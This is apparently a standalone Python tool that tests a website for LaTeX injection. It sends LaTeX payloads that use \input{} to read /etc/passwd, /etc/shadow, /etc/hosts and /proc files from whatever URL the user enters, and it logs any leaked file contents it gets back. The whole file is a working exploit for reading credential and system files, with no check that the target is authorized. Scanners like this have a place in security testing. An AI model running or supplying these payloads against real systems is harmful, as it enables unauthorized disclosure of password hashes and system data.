import requests
import re
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to test for LaTeX injection vulnerability
def test_latex_injection(url):
    logging.info("Testing for LaTeX Injection vulnerability on: %s", url)

    # List of payloads for testing sensitive information collection
    payloads = [
        r"\documentclass{article}\begin{document}\input{/etc/passwd}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/shadow}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/hosts}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/version}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/cpuinfo}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/meminfo}\end{document}",
        # Add more payloads for sensitive information collection here
    ]

    # Variable to track if sensitive information was found
    vulnerable = False

    # Sending requests with each payload
    for payload in payloads:
        logging.info("Sending request with payload: %s", payload)
        response = requests.post(url, data={"payload": payload})

        # Check if the response contains sensitive information
        if re.search(r'(root:|processor)', response.text):
            logging.warning("Sensitive information found in the response:")
            # Highlight sensitive information in the response content
            logging.warning(response.text)
            vulnerable = True

    # Confirm if the target is vulnerable or not
    if vulnerable:
        logging.warning("The target website is vulnerable to LaTeX Injection!")
    else:
        logging.info("The target website is not vulnerable to LaTeX Injection.")

# Main function
def main():
    # Ask for target website URL
    target_url = input("Enter your target website url: ")

    # Test for LaTeX injection vulnerability
    test_latex_injection(target_url)

if __name__ == "__main__":
    main()
